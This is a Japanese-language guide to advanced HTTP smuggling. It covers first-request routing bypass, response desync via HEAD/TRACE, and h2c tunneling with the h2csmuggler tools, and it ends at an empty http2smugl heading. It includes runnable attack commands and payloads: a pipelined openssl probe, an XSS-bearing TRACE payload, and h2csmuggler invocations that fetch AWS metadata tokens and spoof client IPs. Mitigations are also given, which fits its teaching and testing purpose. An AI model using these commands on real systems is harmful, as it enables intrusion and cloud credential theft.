このページが扱うのは、古典的な CL.TE / TE.CL のような「パーサの長さ解釈の不一致」ではなく、**コネクションの状態管理・ルーティング判断そのものの不備**である。原文は次のように位置づける。

> "HTTP connection request smuggling is a connection-state / routing problem rather than a classic CL.TE/TE.CL parser discrepancy. The bug appears when a front-end decides where a connection is allowed to go only once, then silently reuses that same TCP/TLS connection for later requests with a different Host or :authority."

（訳: HTTP コネクションリクエストスマグリングは、古典的な CL.TE/TE.CL のパーサ不一致ではなく、コネクションの状態／ルーティングの問題である。フロントエンドが「この接続がどこへ転送されるべきか」を最初の1回だけ判定し、その後は `Host` や `:authority` が変わっても同じ TCP/TLS 接続を黙って使い回してしまう場合にこのバグが現れる。）

#### 3.1 First-request Validation（最初のリクエストのみを検証する不備）

リバースプロキシは、どのバックエンドへリクエストを振り分けるか、あるいはそのバックエンドへのアクセスが許可されているかを `Host` ヘッダー（HTTP/2 では `:authority` 疑似ヘッダー）を根拠に決定することが多い。ここでよくあるバグは、この許可判定（ホワイトリスト検証）が**接続の最初のリクエストに対してのみ行われる**という実装である。2回目以降のリクエストでは、プロキシは「接続そのもの」を信頼してしまい、リクエストごとの再検証を行わない。

```http
GET / HTTP/1.1
Host: allowed-external-host.example

GET /admin HTTP/1.1
Host: internal-only.example
```

同一 TCP 接続上で1本目のリクエストが許可された外部ホスト向けであれば検証を通過し、2本目で `Host` を内部限定のホストに書き換えても、プロキシが再検証しない実装であればそのまま内部エンドポイントへ転送されてしまう。これは実質的に SSRF（サーバーサイドリクエストフォージェリ、サーバーに任意の内部宛先へリクエストを送らせる攻撃）と同等のプリミティブとして、内部の仮想ホスト、管理パネル、デバッグ用ルート、同一エッジを共有する別テナントへの到達を許してしまう。

#### 3.2 First-request Routing（コネクション全体を1本目基準でルーティングする不備）

一部のリバースプロキシは、**バックエンドコネクション全体の振り分け先**を、最初に転送したリクエストだけを根拠に決定する。以降のリクエストは `Host` が変わっても同一のアップストリームへ送られ続ける。これは Host ヘッダー攻撃（パスワードリセット・ポイズニングやキャッシュポイズニング、仮想ホストのブルートフォースなど）と組み合わせたとき特に有効になる。

```http
GET / HTTP/1.1
Host: public.example

POST /pwreset HTTP/1.1
Host: private.internal
```

PortSwigger の Burp 拡張「HTTP Request Smuggler」には、このようなコネクション状態の不備を検出するための専用プローブが組み込まれている。この種のバグは「単なる接続再利用」「単なるパイプライニング」として見過ごされやすいため、必ず新規コネクションでの制御実験と比較検証することが推奨される。

**なぜ classic な desync と異なるか**という点は3つに整理できる。第一に、CL/TE の食い違いを一切必要としない――危険なのは「ルーティング／認可判断が接続単位でキャッシュされる」という設計そのものである。第二に、接続の再利用が必須条件である点は同じだが、こちらは「パーサのバイト解釈のズレ」ではなく「認可チェックのタイミング」の問題である。第三に誤検知が多い。通常の HTTP 接続再利用・パイプライニングも似た挙動に見えるため、同一リクエストを新規コネクションで再送し、レスポンスの出所・ヘッダー・ステータスコードを比較する必要がある。

#### 3.3 ブラウザ主導のコネクション状態悪用（2022〜2025年の実務動向）

近年最も実践的なバリエーションは、**ブラウザが持つコネクション合体（connection coalescing）機能**を悪用するものである。被害者はまず正規の（あるいは攻撃者が誘導した）オリジンへの接続を確立し、ブラウザがその後、**別のオーソリティ（別ホスト）向けのリクエストに同じ接続を再利用または合体させる**ことで成立する。

HTTP/2・HTTP/3 では、以下の条件が揃うターゲットで悪用可能性が高まる。

- 既存接続で提示されている TLS 証明書が、攻撃者が制御するホスト名とターゲットのホスト名**両方**に対して有効である（例: 同一のワイルドカード証明書やマルチドメイン証明書を共有するインフラ）。
- 古典的な HTTP/2 コネクション合体では、ブラウザは通常両ホスト名が**同一のエッジ／重複する IP セット**に解決されることを要求する。
- **ORIGIN フレーム**（HTTP/2 の拡張機能で、サーバーが「この接続で権威を持つオリジン一覧」を明示的に通知する仕組み）を使うと、「同一 IP かどうか」だけでは判定できないほど、再利用可能とみなされるオーソリティの範囲が広がる場合がある。
- 共有 CDN、API ゲートウェイ、WAF、サービスメッシュ、Alt-Svc／HTTP/3 エンドポイント、ワイルドカード証明書の存在は、いずれもクロスオリジンでの接続再利用の可能性を高める。
- フロントエンドが**リクエストごとではなく接続単位（あるいはストリーム単位ではなく最初の1回）でしかホスト検証・ルーティングを行わない**設計であること。

**典型的な攻撃シナリオ**は次の流れになる。

1. 攻撃者が `evil.com` を制御しており、これは `internal.company` と同一の共有エッジ上で終端している。
2. 被害者が `https://evil.com/` を開き、ブラウザが HTTP/2 または HTTP/3 接続を確立する。
3. 攻撃者は被害者に `https://internal.company/...` へのリクエストを発生させる（`<img>` タグ、`fetch()`、リダイレクトチェーンなど）。
4. エッジが両オリジンに対して権威を持つように見えるため、ブラウザは**既存の接続を再利用**する。
5. エッジが最初のリクエストでしかホスト検証を行っていなければ、`internal.company` 宛の後続リクエストは古い接続状態のまま認可・ルーティングされてしまう。

なお、堅牢な実装では、再利用された接続が新しいオーソリティに対して有効でない場合に **`421 Misdirected Request`** を返す。テスト中に `421` が返ってくるのは、むしろ「サーバーが接続合体を検知し、信頼を拒否した」ことを示す良い兆候である。

**実践的なテスト手順**として、HackTricks は HTTP/1.1 手動プローブの例を示している。

```bash
printf 'GET / HTTP/1.1\r\nHost: public.example\r\nConnection: keep-alive\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal.example\r\nConnection: close\r\n\r\n' \
| openssl s_client -quiet -connect target:443
```

このワンライナーは同一 TLS 接続上に2本のリクエストを続けて送り込み、2本目のレスポンスが明らかに `internal.example` のものであれば、あるいはバックエンドの挙動が「両リクエストが同一ソケットを共有したときにだけ」変化するのであれば、さらに調査する価値がある。

HTTP/2 のワークフローでは、Burp Repeater の「Allow HTTP/2 ALPN override」を有効化して隠れた HTTP/2 対応を検証し、許可されたホスト／オーソリティへ初回リクエストを送った後、**同一の Repeater タブ（＝同一接続）**のまま2本目リクエストの `:authority` またはパスだけを変更する。同じ2本目リクエストを**新規接続**からも送信して対照実験とし、再利用接続でのみルーティング／認可の差異が現れるかを確認する。

この種のコネクション状態バグは、内部仮想ホストの列挙・管理パネルやプレビュー環境へのアクセス、Host ヘッダー攻撃（パスワードリセットポイズニングや内部／代替仮想ホストでのキャッシュポイズニング）、前節までのクライアントサイド非同期化やブラウザ支援型のキュー汚染、そして HTTP/2 ダウングレード時のスマグリング（バックエンドコネクションを汚染するための第2のプリミティブが必要な場合）と組み合わせたときに特に高価値のチェーンとなる。

#### 3.4 関連する状態遷移の悪用: `h2c` アップグレードトンネリング

密接に関連するバグとして、フロントエンドが **`Upgrade: h2c`**（クリアテキストの HTTP/2 へのアップグレード要求）を転送し、`101 Switching Protocols` 応答の後は通信内容の検査を一切やめて、単にバイト列をバックエンドへトンネリングしてしまうケースがある。実運用では、プロキシが最初の HTTP/1.1 リクエストに対してのみルーティング／ACL（アクセス制御リスト）を適用し、それ以降は攻撃者が生の平文 HTTP/2 を直接内部サービスに向けて話せてしまう。

```http
GET / HTTP/1.1
Host: public.example
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA
```

アップグレード形式のトンネリングをサポートするリバースプロキシや、許可範囲の広い `proxy_pass` 設定を持つ環境ではテストする価値がある。

**関連ツール**としては、コネクション状態プローブや隠れ HTTP/2 テスト、ブラウザ支援型非同期化の検証に使える Burp の **HTTP Request Smuggler**、HTTP/2→HTTP/1.1 ダウングレード経路の発見に特化した **`http2smugl`**、Go 実装でカスタマイズ可能なガジェットリストによる高速一括プローブが可能な **`smugglefuzz`**、`Upgrade: h2c` トンネリングの不備に特化した **`h2cSmuggler`** が挙げられている。

**対策（防御目的の要点）**

- `Host` あるいは `:authority` を、ソケット単位ではなく**リクエストごと・HTTP/2 ストリームごとに毎回再検証**する。
- 可能であれば、内部ホスト名と外部ホスト名を別の証明書・別のオリジンセット・別の Alt-Svc アドバタイズに分離する。
- 再利用された接続が新しいオリジンに対して権威を持たない場合は **`421 Misdirected Request`** を返す。
- `Upgrade: h2c` はエッジで明示的に必要でない限り除去するか固定処理する。
- 可能な限り、単一の特権的アップストリーム接続を無関係なテナントや信頼ゾーンをまたいで再利用しない。

> 出典: HTTP Connection Request Smuggling — HackTricks — https://book.hacktricks.xyz/pentesting-web/http-connection-request-smuggling

### 4. HackTricks: HTTP Response Smuggling / Desync（レスポンスキューの非同期化）

最後に扱うのは、リクエスト側ではなく**レスポンス側のキューを非同期化する**発展技法である。この手法の技術的な出典は DEF CON 29 における Martin Doyhenard の発表「Response Smuggling: Pwning HTTP/1.1 Connections」に基づく。

#### 4.1 HTTP リクエストキュー非同期化の基本原理

この技法も根底では HTTP Request Smuggling の脆弱性を悪用する。しかし classic な smuggling が「被害者のリクエストの前に半端なプレフィックスを追加してリクエスト自体を攻撃する」のに対し、この技法は「被害者が受け取るレスポンスを漏えいまたは改ざんする」ことを目的とする。具体的には、半端な1.5本のリクエストを送るのではなく、**完全な2本のリクエストを送信してプロキシのレスポンスキューを非同期化させる**。

**HTTP パイプライン非同期化**の仕組みは次のとおりである。HTTP/1.1 は、前のリクエストへのレスポンスを待たずに複数のリソースを要求できる（パイプライニング）。プロキシが中間に存在する場合、プロキシはバックエンドへ送ったリクエストと、バックエンドから返るレスポンスの対応関係を正しく維持する責務を負う。

ここで問題が生じる。攻撃者が response smuggling 攻撃を仕掛けても、初期リクエストとスマグルしたリクエストの両方に対する応答が**即座に**返ってしまうと、スマグルされたレスポンスは被害者のレスポンスキューには挿入されず、単にエラーとして破棄されてしまう。したがって、**スマグルしたリクエストがバックエンドで処理に時間がかかる**ことが必要になる。時間のかかる処理が完了するまでの間に攻撃者との通信は既に終了しているため、その間に割り込んでくる被害者の正規リクエストが、キュー上でスマグルされたレスポンスと結びついてしまう。

具体的には、被害者がリクエストを送信し、スマグルされたリクエストの処理がそれより先に完了して応答された場合、**スマグルされたレスポンスが被害者に送られる**。これにより攻撃者は被害者が受け取る「レスポンス」を実質的に操作できる。逆に、攻撃者が次のリクエストを送信し、被害者への本来の正規レスポンスがそれより先に完了して応答された場合には、**被害者宛のレスポンスが攻撃者に送られてしまう**。これは `Set-Cookie` ヘッダーなどを含む被害者のレスポンスを窃取することに直結する。

#### 4.2 複数ネストしたインジェクション

classic な request smuggling では「被害者のリクエストの先頭を書き換えて意図しない動作をさせる」ことが目的だが、response smuggling では完全なリクエストを送り込む性質上、**1回のペイロードに数十件ものレスポンスを注入**し、数十人の被害者を同時に非同期化できる。これはエクスプロイトの拡散を容易にするだけでなく、サーバーに対する DoS（サービス拒否）を引き起こす手段としても利用され得る。

**エクスプロイトの構成**は、(1) HTTP Request Smuggling を悪用する初期リクエスト、(2) バックエンドでの処理に時間がかかるリクエスト、(3) レスポンスが被害者へ送られることになる1つ以上のペイロードリクエスト、という順序が典型となる。

#### 4.3 現代的なテストにおける注意点

HackTricks は「現代的なテストの落とし穴」として、**本物のレスポンスキュー汚染**と、無害な**クライアント側パイプライニング／接続再利用のアーティファクト**を混同しがちであると警告する。PoC が `requestsPerConnection > 1` の設定でしか動作しない、Burp Repeater で単一ソケット上にリクエストをグループ化した場合にしか再現しない、あるいは明示的な接続再利用に依存する場合は、接続再利用を無効にして再テストすべきである。そうしないと、実際にはフロントエンドとバックエンドの非同期化ではなく、**自分のクライアントとサーバーの間だけが非同期化している**に過ぎない可能性がある。

一方で、コネクションロックされたリクエストスマグリング、コネクション状態攻撃（前項3節）、クライアントサイド非同期化（前々項2節）のように、接続再利用そのものが正当な前提条件となるケースも存在する。確認のコツとして、同じプリミティブを HTTP/2 ダウングレード経路上で再試行し、単一レスポンスの中に**ネストした HTTP/1 レスポンス**が現れるかを確認する方法がある。これができれば、単なるパイプライニングの見かけ上の現象ではなく、本物のパーサ不一致を見ている可能性が高い。

#### 4.4 レスポンス非同期化の悪用パターン

**他ユーザーのリクエストの窃取**は、classic な request smuggling のペイロードと似ているが、重要な違いとして「送信内容がレスポンスに反映される」ことさえ満たせばよく、永続的なストレージへの保存は不要である。攻撃者はまず、反射されるパラメータを末尾に含み、大きな `Content-Length` を持つ最終 POST リクエストを含むペイロードを送信する。初期リクエストが処理され、時間のかかるリクエスト（sleepy request）が処理されている間に到着した被害者からの次のリクエストは、反射パラメータの直後にキュー上で連結される。結果として被害者は sleepy リクエストへのレスポンスを受け取り、その間に攻撃者が別のリクエストを送っていれば、反射されたコンテンツを含むレスポンスが攻撃者へ送られる。

**レスポンス非同期化のさらなる深化**として、`HEAD` リクエストの特性を利用する手法がある。`HEAD` レスポンスは仕様上ボディを含んではならないが、`GET` と同様の `Content-Length` を持つ（＝実際には存在しないボディの長さを名乗る）ことが定義されている。攻撃者が `HEAD` リクエストをスマグルすると、そのレスポンスが被害者に送られたとき、プロキシは名乗られた `Content-Length` 分のボディが来るまで待機し続ける。この「本来存在しないはずのボディ待ち」状態に、攻撃者が別途スマグルしておいた次のレスポンス（実質的にはコンテンツ）が流し込まれる。

**コンテンツ混同（Content Confusion）**は、この性質を利用し、攻撃者が「被害者が受け取るレスポンスのボディ」を完全に制御できることを示す。`HEAD` レスポンスのヘッダーには通常 `Content-Type` と `Content-Length` が含まれるため、攻撃者はこれを悪用して、ページ自体には XSS 脆弱性が存在しなくても被害者に対して XSS を発生させるリクエストを送信できる。

**`TRACE` をリフレクションガジェットとして使う手法**は比較的新しい実践的な更新である。ターゲットに明確な反射エンドポイントが存在しない場合、スマグルした `TRACE` リクエストをレスポンスボディの生成源として利用できる。`TRACE` メソッドはバックエンドが受け取ったリクエストそのものを反射する仕様であり、しばしばプロキシが付加したヘッダー（`X-Forwarded-For` やダウングレードされた `HTTP/1.1` の開始行など）も含めて反射される。これをスマグルした `HEAD` と組み合わせることで、キュー非同期化を「攻撃者が完全に制御するバイト列」を被害者のレスポンスに混入させる手段に変えられる。典型的なパターンは次のとおりである。

```http
GET / HTTP/1.1
Host: target
Content-Length: 150

HEAD / HTTP/1.1
Host: target

TRACE / HTTP/1.1
Host: target
X-Pad: ...padding...
X: <script>alert(1)</script>
```

1. `HEAD` をスマグルし、プロキシに「レスポンスボディの長さを期待させる」状態を作る一方で、バックエンドはヘッダーのみしか送らない状態にする。
2. 直後に攻撃者制御のヘッダーと十分なパディングを持つ `TRACE /...` をスマグルする。
3. `TRACE` のレスポンスが、先の `HEAD` レスポンスに不足していたボディとして扱われる。
4. これをコンテンツ混同、レスポンス分割、キャッシュポイズニング、あるいは単にプロキシがリクエストをバックエンドへ届ける前にどう書き換えているかを知るための情報収集に転用できる。

エッジが `TRACE` を明示的にブロックしていても、スマグリングによってフロントエンド／WAF からは隠しつつバックエンドへ直接届けられる場合がある点は、防御設計上見落としやすい。とりわけ HTTP/2→HTTP/1 のダウングレードシナリオでは、ダウングレードされたリクエスト行やプロキシが注入したヘッダーがそのまま `TRACE` のボディに反射されるため、内部実装の詳細が漏えいするリスクが高まる。

**キャッシュポイズニング**は、前述のコンテンツ混同攻撃を応用し、被害者へのリクエストに対するレスポンスとしてキャッシュに保存されるものが、攻撃者が注入した XSS を含むレスポンスであった場合に成立する。このとき「被害者」が攻撃者自身であれば、攻撃者はキャッシュされる URL 自体を自由に選べるため、任意の URL に対するキャッシュポイズニングが可能になる点は特に危険度が高い。

**Web Cache Deception** は類似の技法だが、ペイロードをキャッシュに注入するのではなく、**被害者の情報をキャッシュ内に格納させる**方向で悪用する点が異なる。

**レスポンス分割（Response Splitting）**は、レスポンス非同期化を利用して、プロキシに「100%攻撃者が生成したレスポンス」を送信させることを目的とする。これを実現するには、値をレスポンスに反射するエンドポイントを見つけ、かつ `HEAD` レスポンスの `Content-Length` を正確に把握する必要がある。最初のリクエストが解決されて攻撃者に返された後、被害者のリクエストがキューに追加される。被害者は `HEAD` レスポンス＋2本目のリクエストのレスポンス内容（反射データの一部を含む）を結合したものをレスポンスとして受け取る。ただし、この反射データのサイズは `HEAD` レスポンスの `Content-Length` に従ってキュー上で有効な HTTP レスポンスとして成立するよう調整されている。結果として、**2人目の被害者の次のリクエスト**は完全に攻撃者が作り込んだレスポンスを受け取ることになり、このレスポンスをキャッシュさせることも可能である。

#### 4.5 2024〜2025年に注目すべき新しいレスポンス側の不一致

近年の研究では、レスポンス非同期化は `HEAD` トリックだけに限定されないことが示されている。監査時には、classic な CL.TE / TE.CL のリクエスト側の食い違いだけでなく、レスポンス変換層についても以下を確認すべきである。

- **レスポンスの TE.CL／dechunk-vs-length の不一致**: ある中継段がバックエンドのレスポンスをデチャンク（`Transfer-Encoding: chunked` を展開）する、または `Transfer-Encoding` を除去する一方、別の中継段が依然として `Content-Length` を信頼している場合、バックエンドのバイト列を偽造した後続レスポンスへ転換できてしまう。
- **レスポンス順序バグ**: マルチエンドポイントのフレームワークの中には、教科書的な CL.TE プリミティブが無くとも、レスポンスを誤ったリクエストに対応付けてしまうものがあり、**レスポンス窃取**を可能にする。
- **CGI／ゲートウェイ変換の問題**: CGI・FastCGI・uWSGI 系のゲートウェイがバックエンドの出力を HTTP レスポンスへ変換する際、CGI レスポンスが発行したヘッダーが最終的な HTTP レスポンスへ漏れ込み、新たなレスポンス側非同期化のガジェットを生む場合がある。

攻撃者視点で言えば、これは classic なリクエスト側スマグリングの検査結果が一見クリーンであっても、レガシーメソッド（`HEAD`、`TRACE`）、レスポンス書き換えを行う中間装置、CGI／プロキシアダプタについては別途テストする価値があることを意味する。ソースコードからの実装レビューでは、HTTP リクエストだけでなく HTTP レスポンスおよび CGI レスポンスの不一致まで見つけられるグレーボックス差分ファジングが、2024〜2025年時点で実用段階に達している（USENIX Security 2025 の関連論文を参照）。

**ツールに関する補足**として、Burp の HTTP Request Smuggler はこれらの脆弱性を日常的に検証する上で最も実践的な選択肢であり続けている。特にレスポンス窃取やキャッシュポイズニングへのチェーンが必要な場合に有効である。

> 出典: HTTP Response Smuggling / Desync — HackTricks — https://book.hacktricks.xyz/pentesting-web/http-response-smuggling-desync

### まとめ: 発展的スマグリング技法が防御設計に示唆すること

この4つの資料に共通するのは、「メッセージ境界の解釈がどこか一箇所でもズレれば、パーサの数だけ脆弱性の温床が生まれる」という原則である。CSD はブラウザという制約された送信主体からでも成立し得ること、コネクションリクエストスマグリングはヘッダー解釈の不一致すら不要でルーティング判断のタイミングだけで成立し得ること、レスポンススマグリングはリクエストではなくレスポンスのキュー管理そのものが攻撃対象になり得ることを、それぞれ示している。防御側は「`Content-Length` と `Transfer-Encoding` の食い違いを1箇所塞いだから安全」という発想を捨て、接続の再利用条件・ホスト検証のタイミング・レスポンスとリクエストの対応管理という、より広いレイヤーでの一貫性を継続的に検証する必要がある。

## HTTP/2 cleartext（h2c）smuggling ツール

これまでの章では、HTTP/1.1 同士のフロントエンド・バックエンド間でリクエスト境界の解釈がずれる「古典的な」HTTPリクエストスマグリングを扱ってきた。本節では視点を変え、**プロトコルの境界そのものを飛び越える**攻撃、すなわち HTTP/2 cleartext（以下 h2c）のアップグレード機構を悪用してプロキシ層のアクセス制御を丸ごとバイパスする手法と、それを実践するための3つの代表的ツールを扱う。いずれも防御・検証目的での理解を前提とし、実在サービスへの無許可の実行は対象外とする。

### h2c smuggling とは何か

まず前提となるプロトコルの挙動を整理する。h2c とは「HTTP/2 over cleartext（TLSなし）」の略称で、RFC 7540（現行は RFC 9113）が定義する仕組みの一つに、既存の HTTP/1.1 接続を **HTTP/1.1 の `Upgrade` ヘッダを使って HTTP/2 に昇格させる** という手順がある。クライアントは次のようなリクエストを送る。

```
GET / HTTP/1.1
Host: example.com
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: <base64url でエンコードした SETTINGS フレーム>
```

サーバがこの昇格に応じる場合、`101 Switching Protocols` を返し、**その直後から同一の TCP 接続上でバイナリの HTTP/2 フレームによる通信が始まる**。つまり、テキストベースの HTTP/1.1 リクエストが「引き金」となって、同じソケットが丸ごと別プロトコルのトンネルに変わるという、プロトコル設計上かなり特殊な挙動である。

ここに脆弱性が生まれる理由は、リバースプロキシやロードバランサの多くが「バックエンドへ転送するヘッダを取捨選択する」責務を負っているにもかかわらず、`Connection` や `Upgrade` ヘッダをフィルタせずにそのままバックエンドへ中継してしまう実装が少なくないためである。攻撃者はプロキシ（フロントエンド）に対して、実際の宛先はバックエンドの内部サービスである昇格リクエストを送る。プロキシはアクセス制御（パスベースのルーティング制限、認証、WAFルールなど）を「HTTP/1.1 の個々のリクエストごとに」適用しているつもりでも、いったん h2c 昇格が成立してしまえば、**その1本のTCP接続はプロキシのその後の検査を経由しない、攻撃者とバックエンドの直接トンネル**になる。以降、攻撃者は同じ接続上で HTTP/2 の多重化（マルチプレクシング）を使い、任意のパス・任意のヘッダを持つリクエストをバックエンドへ直接投げ込める。これがプロキシの認可ロジックを完全にバイパスする「h2c smuggling」の核心である。

重要な限定条件として、これは「プロキシ層にバイパスすべきアクセス制御が存在する場合にのみ」意味を持つ脆弱性である。単にリクエストをそのままバックエンドへ転送するだけのロードバランサ（それ自体が制御を課していない構成）では、h2c 昇格が成立してもセキュリティ上の実害は生じない。この前提は、後述する3ツールすべてに共通する評価軸である。

以下、この h2c smuggling を実証・悪用するためのツールとして広く使われている2つの実装（Bishop Fox 版と Assetnote 版）と、隣接する研究として HTTP/2 → HTTP/1.1 のダウングレード変換時に生じるスマグリングを扱う `http2smugl` を順に見ていく。

### Bishop Fox h2cSmuggler（Python）

h2c smuggling を最初に体系化して公開したのが、Bishop Fox の Jake Miller による研究とツール `h2cSmuggler` である。Python 製で、依存ライブラリは `h2`（HTTP/2 プロトコル実装）のみという軽量な構成になっている。

```
pip3 install h2
```

#### 基本的な使い方

ツールは「攻撃対象のエッジサーバ（プロキシ）」と「トンネルを通して到達したい内部URL」の2つを指定する形で動作する。

```
usage: h2csmuggler.py [options] [url]

  --scan-list SCAN_LIST       一括スキャン対象のURLリスト
  --threads THREADS           スキャンのスレッド数
  -x PROXY, --proxy PROXY     テスト/バイパス対象のプロキシサーバ
  -X REQUEST                  スマグルするリクエストのHTTPメソッド
  -d DATA, --data DATA        リクエストボディ
  -H HEADER                   カスタムヘッダ（複数指定可）
  -i WORDLIST                 パスのブルートフォース用ワードリスト
  -m MAX_TIME                 ソケットタイムアウト秒数（既定10秒）
  -t, --test                  単一プロキシに対する疎通テスト
  --upgrade-only               HTTP2-Settings ヘッダを送らない
  -v, --verbose                詳細出力
```

複数エンドポイントの一括スキャンは次のように行う。

```
./h2csmuggler.py --scan-list urls.txt --threads 5
```

#### なぜこの構文になるのか

`-x`（プロキシ）と末尾の `url`（実際にトンネル越しに送りたいリクエスト先）が分離されているのは、この攻撃の構造そのものを反映している。攻撃者から見た「宛先」はプロキシのTCP接続であり、そこにh2c昇格を成立させたあと、**HTTP/2フレーム上で改めて別のパス・ホストを指定したリクエストを送る**という二段階構造になっているためである。`--upgrade-only` は `HTTP2-Settings` ヘッダを省略するオプションだが、これは一部のプロキシ実装が `HTTP2-Settings` の値（base64urlエンコードされたSETTINGSフレーム）のデコードに失敗して昇格自体を拒否するケースがあり、その場合に最小限の `Upgrade: h2c` だけで昇格を試みるための回避策である。

#### 実践例1: 認可バイパスによる内部APIへのアクセス

```
./h2csmuggler.py -x https://edgeserver -X POST \
  -d '{"user":128457,"role":"admin"}' \
  -H "Content-Type: application/json" \
  http://backend/api/internal/user/permissions
```

このコマンドは、公開エッジサーバ `edgeserver` に対して h2c 昇格を試み、成功したトンネル上で `backend` 内部の `/api/internal/user/permissions` に直接 POST する。プロキシが本来この内部APIへのアクセスを制限していたとしても、トンネルはプロキシの検査ロジックを経由しないため制限が効かない。

#### 実践例2: クラウドメタデータへの SSRF 連鎖

```
# トークン取得
./h2csmuggler.py -x https://edgeserver -X PUT \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  http://169.254.169.254/latest/api/token

# メタデータ取得
./h2csmuggler.py -x https://edgeserver \
  -H "x-aws-ec2-metadata-token: TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

これは h2c smuggling を SSRF（サーバサイドリクエストフォージェリ）の踏み台として使う例である。プロキシ自体がクラウド環境内で稼働している場合、そのプロキシ経由で確立したトンネルは「プロキシのネットワーク位置」からリクエストを発行できる。IMDSv2（Instance Metadata Service v2）はトークンベースの防御を導入しているが、そのトークン取得・使用の2ステップともにトンネル越しに実行できてしまえば、防御としては無力化される。これは本シリーズのSSRF章で扱った「多段防御が単一の経路突破で丸ごと迂回される」典型例でもある。

#### 実践例3: ワードリストによる内部パスの総当たり

```
./h2csmuggler.py -x https://edgeserver -i dirs.txt http://localhost/
```

`-i` はワードリストを使い、確立済みの単一 h2c トンネル上で多数のパスを試す機能である。HTTP/2 はストリーム多重化により1本のTCP接続上で複数リクエストを並行して送れるため、TCP接続の再確立コストなしに高速なパス探索が可能になる。これはブルートフォースが検知されにくくなる一因でもある——多くのIDS/WAFはリクエストレート（新規コネクション数や単位時間あたりのHTTPリクエスト数）を監視の起点にしているが、h2cトンネルは「1本の正規に見えるコネクション」の内側で完結するため、コネクション単位の異常検知をすり抜けやすい。

#### 実践例4: ヘッダ偽装によるIPベースアクセス制御の回避

```
./h2csmuggler.py -x https://edgeserver \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 172.16.0.1" \
  http://backend/system/dashboard
```

バックエンドが `X-Forwarded-For` や `X-Real-IP` を信頼してアクセス制御に使っている場合（本来はロードバランサ/プロキシが上書き・付与すべき値）、トンネル経由でこれらのヘッダを攻撃者が自由に設定して送り込めることを示す例である。

#### 検知と防御

原典が明示する最も本質的な対策は、**プロキシ側でユーザ入力由来の `Upgrade` および `Connection` ヘッダをバックエンドへ転送しないこと**である。h2c 昇格自体は正当な仕様上の機能なので、これを完全に無効化する必要はなく、「エッジ層で意図的に許可した昇格経路以外は握りつぶす」実装にすれば足りる。具体的には、リバースプロキシの設定で以下のいずれかを行う。

- `Connection` ヘッダのうち `Upgrade` を含む値をクライアントからバックエンドへ転送しない（多くのプロキシソフトウェアはデフォルトで `hop-by-hop` ヘッダとして `Connection` を除去するが、設定によっては維持されるケースがある）。
- バックエンドが h2c を必要としないなら、バックエンド側で `Upgrade: h2c` へのアップグレード応答を無効化する。

検知面では、リポジトリに同梱の Burp Suite 拡張、または `-t/--test` フラグによる単発の疎通テストが使える。ただし原典は **誤検知（false positive）** にも言及しており、プロキシ自身が h2c 対応でアップグレード要求に直接応答してしまい、実際にはバックエンドへ転送されていないケースがあるため、「101が返った」だけで脆弱と断定せず、実際にバックエンド固有の情報（内部専用パスのレスポンスなど）が取得できるかまで確認する必要がある。

> 出典: h2cSmuggler (Bishop Fox) — https://github.com/BishopFox/h2csmuggler

### Assetnote h2csmuggler（Go実装）

Assetnote が公開している同名の `h2csmuggler` は、Bishop Fox の元の研究をベースにしつつ、**Go言語で書き直し、かつ TLS 接続上でも非仕様準拠の h2c アップグレードを許容するように標準ライブラリを改造した**という点で技術的に一歩踏み込んだ実装である。

> 実装方針の要点: 「`net/http2` ライブラリをフォークし、クライアント側が TLS 接続上でも非仕様準拠の h2c アップグレードを受け入れて処理できるように改変した」

#### なぜ「TLS上のh2c」が重要なのか

本来 h2c は名前の通り cleartext（平文）専用であり、HTTP/2 の仕様上、TLS接続では ALPN（Application-Layer Protocol Negotiation）による `h2` ネゴシエーションを使うのが正規の経路である。TLS上で `Upgrade: h2c` を使うこと自体は仕様上非標準の挙動だが、実装によっては——特にプロキシがTLS終端を行い、バックエンドへは別のTLS接続やcleartext接続で転送するような多段構成において——この非標準な組み合わせが通ってしまうケースがある。オリジナルのPython版が主にcleartextの h2c 昇格経路を扱うのに対し、Go版はTLS層をまたぐ変則的な経路まで検証対象を広げることで、より広い範囲の実運用構成（TLS終端プロキシ＋内部バックエンド）を対象にできる、という設計思想である。

#### CLIコマンド構成

3つの主要サブコマンドが提供される。

**1. `check`** — h2c接続の成立可否を検証する。

```
go run ./cmd/h2csmuggler check https://google.com/ http://localhost
```

**2. `smuggle`** — 確立したトンネル上で複数URLを順次リクエストする。

```
go run ./cmd/h2csmuggler smuggle https://google.com/ https://google.com/flag
```

**3. `demo`** — 非仕様準拠のアップグレード接続を受け入れるテスト用HTTPサーバを起動する。これは自分の管理下にある環境で挙動を再現・検証するための、防御研究に有用な機能である。

#### パイプラインによる高度な運用

Go版はUnixパイプとの親和性を意識した設計になっており、パスのミューテーション（変異生成）ツールとスマグリングを連結する使い方が例示されている。

```
cat ~/tools/lists/rafter.txt | ./h2cs mutate pitchfork http://localhost - -p api | ./h2cs smuggle http://localhost - -ojson
```

この構成は、ワードリストをまず `mutate` サブコマンドで変換・展開し（例えば `pitchfork` モードで複数の入力リストを組み合わせる、`-p api` でAPI関連のパスパターンを付与するなど）、その出力を `smuggle` に渡して実際にトンネル越しのリクエストとして送信し、`-ojson` で結果を構造化データとして得る、という一連のパイプラインである。JSON出力はCI/CDや他のセキュリティスキャンツールとの統合を意図したものであり、大規模な資産（アセット）に対する継続的な監視・スキャンの自動化に向いた設計だと分かる。

#### Python版との使い分けの勘所

- **Python版（Bishop Fox）**は最小依存で、単発の検証や手動でのPoC作成に向く。`-x`/URL という直感的な引数構造で、個別の内部リクエストを組み立てるのに適している。
- **Go版（Assetnote）**は非仕様準拠のTLS越しh2c経路まで検証範囲を広げ、かつパイプライン指向のサブコマンド構成により、大規模資産に対する自動スキャンやCI組み込みに向いている。

いずれも防御側が自社インフラの構成を検証する際には、「クラウド環境やCDN配下で複数段のプロキシ/ロードバランサを経由する構成」を対象に、`check`（またはPython版の`-t`）から始めて疎通の有無を確認し、実害の有無（内部限定リソースへの到達性）を別途確認するという順序が安全である。

> 出典: h2cSmuggler (Assetnote, Go実装) — https://github.com/assetnote/h2csmuggler

### http2smugl（Emil Lerner）

